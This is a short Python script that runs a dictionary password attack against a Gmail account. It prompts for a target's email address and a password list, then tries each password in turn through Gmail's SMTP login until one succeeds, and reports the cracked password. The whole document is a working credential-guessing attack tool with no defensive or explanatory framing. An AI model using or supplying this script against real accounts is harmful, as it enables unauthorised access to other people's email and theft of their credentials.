#!/usr/bin/python

import smtplib
from termcolor import colored

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("[+] Enter Targets Email Address: ")
passwdfile = input("[+] Enter the path to the password list file: ")
passfile = open(passwdfile, "r")

for password in passfile:
    password = password.strip('\n')
    try:
        smtpserver.login(user, password)
        print(colored("[+] Password found: %s" % password, 'green'))
        break
    except smtplib.SMTPAuthenticationError:
        print(colored("[-] Wrong password: " + password, 'red'))

